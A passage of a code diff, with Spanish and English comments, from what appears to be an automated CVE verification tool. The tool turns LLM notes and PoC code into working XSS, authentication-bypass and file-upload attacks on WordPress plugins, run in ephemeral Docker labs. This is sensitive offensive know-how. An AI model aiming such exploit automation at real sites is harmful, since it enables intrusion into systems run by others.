+                # header-bypass que era el path correcto).
+                _custom_headers = notes.get("custom_headers")
                 wr = None
                 # TERCERA forma, distinta de las dos de abajo: NINGUNA sesion previa hace falta
                 # (confirmado en vivo, CVE-2026-2991/KiviCare) -- nunca se adivina sola a partir
@@ -3898,7 +4139,7 @@ def _run_web_investigation(inv: "Investigation", lang: str, step, llm=None,
                         on_step=step, budget_s=budget_s, companion_plugins=companion_plugins,
                         shortcode_name=shortcode_name_generic,
                         keep_lab_on_failure=keep_lab_on_failure)
-                elif email_p or pass_p:
+                elif (email_p or pass_p) and not _custom_headers:
                     step(("intentando verificacion DINAMICA -- patron de cambio de credencial "
                          "(WordPress+MySQL efimero en Docker)..." if es else
                          "attempting DYNAMIC verification -- credential-change pattern "
@@ -3971,7 +4212,7 @@ def _run_web_investigation(inv: "Investigation", lang: str, step, llm=None,
                 # lugar de parametros ID/email/pass, O cuando el analista los pasa con
                 # --custom-headers. Corre incluso si login-as ya intento y fallo (wr no None
                 # pero wr.verified False), porque el mecanismo es completamente distinto.
-                _custom_headers = notes.get("custom_headers")
+                # (_custom_headers ya definido arriba, antes del elif chain)
                 if _custom_headers and isinstance(_custom_headers, dict) and not (wr and wr.verified):
                     from .wpverify import verify_wordpress_header_auth_bypass
                     step(("intentando verificacion DINAMICA -- header-based auth bypass "
@@ -4782,28 +5023,85 @@ def _run_web_investigation(inv: "Investigation", lang: str, step, llm=None,
             elif (not is_drupal and not is_joomla and fr.kind in ("wordpress-plugin", "local-zip", "zip-url") and plugin_dir
                   and inv.vuln_class == "xss" and notes.get("endpoint")):
                 from .wpverify import verify_wordpress_xss, _pick_param, _XSS_HINTS
-                # XSS hook: escaner deterministico para encontrar el par injection→view
-                # cuando el LLM no incluye stored_xss_view_path en sus notas o elige el
-                # endpoint equivocado. Solo anula si encontramos algo mejor (endpoint y
-                # view_path determinados del codigo real).
-                if fr.local_path and not str(notes.get("stored_xss_view_path") or "").strip():
+                # XSS hook: escaner deterministico para encontrar el par injection→view.
+                # Se activa cuando (a) el LLM no incluye stored_xss_view_path, O (b) el LLM
+                # tiene view_path pero no tiene un xss_param/endpoint valido para inyectar
+                # (caso tipico: LLM sabe donde admin ve el payload pero no sabe como inyectarlo).
+                _llm_has_valid_xss_param = (
+                    bool(str(notes.get("xss_param") or "").strip()) or
+                    bool(_pick_param(notes.get("parameters") or [], _XSS_HINTS))
+                )
+                if fr.local_path:
                     from .websource import find_stored_xss_endpoint as _xss_scan
                     _xss_code_hit = _xss_scan(fr.local_path)
                     if _xss_code_hit:
-                        _xss_act = _xss_code_hit["inject_action"]
                         _xss_p_hint = _xss_code_hit["inject_param"]
-                        _xss_ep_new = f"/wp-admin/admin-ajax.php?action={_xss_act}"
                         _xss_view = _xss_code_hit["view_path"]
-                        step((f"escaner deterministico (XSS, pre-verificacion): "
-                              f"action='{_xss_act}' param='{_xss_p_hint}' "
-                              f"view='{_xss_view}'") if es else
-                             (f"deterministic XSS pre-scan: action='{_xss_act}' "
-                              f"param='{_xss_p_hint}' view='{_xss_view}'"))
-                        notes["endpoint"] = _xss_ep_new
-                        notes["ajax_action"] = _xss_act
-                        notes["http_method"] = "POST"
-                        notes["xss_param"] = _xss_p_hint
-                        notes["stored_xss_view_path"] = _xss_view
+                        _xss_method = _xss_code_hit.get("http_method", "POST")
+                        # REST API endpoint (inject_endpoint presente) vs AJAX action
+                        if _xss_code_hit.get("inject_endpoint"):
+                            _xss_ep_new = _xss_code_hit["inject_endpoint"]
+                            _xss_all_params = _xss_code_hit.get("inject_params_all", [_xss_p_hint])
+                            _xss_transform = _xss_code_hit.get("payload_transform", "")
+                            _transform_note = f" transform={_xss_transform}" if _xss_transform else ""
+                            if not _llm_has_valid_xss_param:
+                                # LLM didn't find the param: adopt the scanner's endpoint/params too.
+                                step((f"escaner deterministico (XSS REST, pre-verificacion): "
+                                      f"endpoint='{_xss_ep_new}' param='{_xss_p_hint}'"
+                                      f"{_transform_note} view='{_xss_view}'") if es else
+                                     (f"deterministic XSS pre-scan (REST API): endpoint='{_xss_ep_new}' "
+                                      f"param='{_xss_p_hint}'{_transform_note} view='{_xss_view}'"))
+                                notes["endpoint"] = _xss_ep_new
+                                notes["parameters"] = _xss_all_params
+                                notes["http_method"] = _xss_method
+                            else:
+                                # LLM already has a param; still enrich with payload_transform and
+                                # render_context from the scanner — these are independent of the param
+                                # and critical for correctness (e.g. base64 bypass, js_innerHTML).
+                                step((f"escaner deterministico (enriquecimiento): "
+                                      f"transform={_xss_transform or 'none'} "
+                                      f"render_context={_xss_code_hit.get('render_context','unknown')}") if es
+                                     else (f"deterministic XSS enrichment: "
+                                           f"transform={_xss_transform or 'none'} "
+                                           f"render_context={_xss_code_hit.get('render_context','unknown')}"))
+                            if _xss_transform:
+                                notes["payload_transform"] = _xss_transform
+                            # Params de activacion de hook (ej. wp_statistics_hit_rest=1)
+                            _base_p = _xss_code_hit.get("inject_base_params") or {}
+                            if _base_p and not _llm_has_valid_xss_param:
+                                notes["base_params"] = _base_p
+                            # Contexto de renderizado detectado por trazado de codigo
+                            _rctx = _xss_code_hit.get("render_context", "unknown")
+                            if _rctx and _rctx != "unknown":
+                                notes["render_context"] = _rctx
+                        else:
+                            if not _llm_has_valid_xss_param:
+                                _xss_act = _xss_code_hit["inject_action"]
+                                _xss_ep_new = f"/wp-admin/admin-ajax.php?action={_xss_act}"
+                                step((f"escaner deterministico (XSS AJAX, pre-verificacion): "
+                                      f"action='{_xss_act}' param='{_xss_p_hint}' "
+                                      f"view='{_xss_view}'") if es else
+                                     (f"deterministic XSS pre-scan (AJAX): action='{_xss_act}' "
+                                      f"param='{_xss_p_hint}' view='{_xss_view}'"))
+                                notes["endpoint"] = _xss_ep_new
+                                notes["ajax_action"] = _xss_act
+                                notes["http_method"] = _xss_method
+                        if not _llm_has_valid_xss_param:
+                            notes["xss_param"] = _xss_p_hint
+                        # Sobreescribir view_path solo si el LLM no tiene uno especifico
+                        # o si tiene uno generico/incorrecto (edit-comments, edit.php, etc.)
+                        # El scanner es mas fiable que el LLM para la vista de verificacion:
+                        # si el scanner encontro un REST endpoint (analisis de codigo real),
+                        # su view_path SIEMPRE gana sobre el LLM.
+                        # Para AJAX, solo sobreescribir si el LLM eligio un path claramente malo.
+                        _scanner_found_rest = bool(_xss_code_hit.get("inject_endpoint"))
+                        _BAD_VIEW_PATHS = {
+                            "/wp-admin/edit-comments.php", "/wp-admin/edit.php",
+                            "/wp-admin/edit-posts.php", "/wp-admin/posts.php",
+                        }
+                        _llm_view_now = str(notes.get("stored_xss_view_path") or "").strip()
+                        if _scanner_found_rest or not _llm_view_now or _llm_view_now in _BAD_VIEW_PATHS:
+                            notes["stored_xss_view_path"] = _xss_view
                 params = notes.get("parameters") or []
                 xss_p = notes.get("xss_param") or _pick_param(params, _XSS_HINTS)
                 step(("intentando verificacion DINAMICA -- ejecucion real en navegador headless "
@@ -4817,12 +5115,16 @@ def _run_web_investigation(inv: "Investigation", lang: str, step, llm=None,
                 else:
                     step(("XSS REFLEJADO: probando en el mismo endpoint de inyeccion") if es else
                          ("REFLECTED XSS: testing on the same injection endpoint"))
+                _xss_base_params = notes.get("base_params") or {}
                 wr = verify_wordpress_xss(fr.local_path, plugin_dir, notes.get("endpoint"),
                                           notes.get("http_method") or "GET", params,
                                           xss_param_hint=xss_p or "", on_step=step, budget_s=budget_s,
                                           companion_plugins=companion_plugins, shortcode_name=shortcode_name_generic,
                                           keep_lab_on_failure=keep_lab_on_failure,
-                                          stored_xss_view_path=_stored_view)
+                                          stored_xss_view_path=_stored_view,
+                                          payload_transform=str(notes.get("payload_transform") or ""),
+                                          extra_inject_params=_xss_base_params,
+                                          render_context=str(notes.get("render_context") or "unknown"))
                 xss_wp_extra_nonce_pages: List[str] = []
                 xss_wp_extra_setup_trigger_paths: List[str] = []
                 def _on_xss_wp_suggestion(sug):
@@ -5129,7 +5431,7 @@ def _run_web_investigation(inv: "Investigation", lang: str, step, llm=None,
                     technique_label="file upload Drupal")
                 _apply_wpverify_result(inv, wr, es, llm)
             elif (not is_drupal and not is_joomla and fr.kind in ("wordpress-plugin", "local-zip", "zip-url") and plugin_dir
-                  and inv.vuln_class == "file-upload" and notes.get("endpoint")):
+                  and inv.vuln_class in ("file-upload", "arbitrary-file-upload") and notes.get("endpoint")):
                 from .wpverify import verify_wordpress_file_upload, _pick_param, _FILE_UPLOAD_HINTS
                 params = notes.get("parameters") or []
                 file_p = notes.get("file_param") or _pick_param(params, _FILE_UPLOAD_HINTS)
@@ -5187,7 +5489,7 @@ def _run_web_investigation(inv: "Investigation", lang: str, step, llm=None,
             # docker-compose.yml -- confirma el ALMACENAMIENTO real (grep dentro del contenedor),
             # nunca la ejecucion (eso exigiria conocer la URL publica real, especifica del stack).
             elif (not plugin_dir and fr.local_path and
-                  inv.vuln_class == "file-upload" and notes.get("endpoint")):
+                  inv.vuln_class in ("file-upload", "arbitrary-file-upload") and notes.get("endpoint")):
                 from .genericverify import verify_generic_file_upload, _pick_param
                 from .wpverify import _FILE_UPLOAD_HINTS
                 params = notes.get("parameters") or []
@@ -5550,12 +5852,28 @@ def investigate_cve(cve_id: str, binary: str = "", config=None, llm=None,
                 inv.llm_notes["http_method"] = raw_req["method"]
                 if raw_req["body_params"]:
                     inv.llm_notes["parameters"] = raw_req["body_params"]
+                if raw_req.get("custom_headers"):
+                    inv.llm_notes["custom_headers"] = raw_req["custom_headers"]
                 step((f"bloque de peticion HTTP cruda encontrado en el PoC -- usando "
                      f"{raw_req['method']} {raw_req['path']} con los parametros y valores REALES "
-                     f"tal cual (sin pasar por el LLM, cero riesgo de alucinacion)") if es else
+                     f"tal cual (sin pasar por el LLM, cero riesgo de alucinacion)"
+                     + (f"; custom_headers detectadas: {list(raw_req['custom_headers'].keys())}"
+                        if raw_req.get('custom_headers') else "")) if es else
                      (f"raw HTTP request block found in the PoC -- using {raw_req['method']} "
                      f"{raw_req['path']} with the REAL parameters and values as-is (no LLM "
-                     f"involved, zero hallucination risk)"))
+                     f"involved, zero hallucination risk)"
+                     + (f"; custom_headers detected: {list(raw_req['custom_headers'].keys())}"
+                        if raw_req.get('custom_headers') else "")))
+            # Si no hay raw HTTP block O si el raw block no trajo custom_headers:
+            # buscar cabeceras no-estandar en el codigo fuente del PoC (Python/bash/curl).
+            if poc_text and not inv.llm_notes.get("custom_headers"):
+                _code_headers = _extract_custom_headers_from_poc_code(poc_text)
+                if _code_headers:
+                    inv.llm_notes["custom_headers"] = _code_headers
+                    step((f"cabeceras no-estandar detectadas en el codigo del PoC: "
+                         f"{list(_code_headers.keys())}") if es else
+                         (f"non-standard headers found in PoC code: "
+                          f"{list(_code_headers.keys())}"))
 
     # 2b) hechos conocidos del analista: PISAN la hipotesis del LLM en esas claves (el analista
     # que tiene el aviso oficial delante sabe el slug/endpoint reales mejor que una adivinanza).
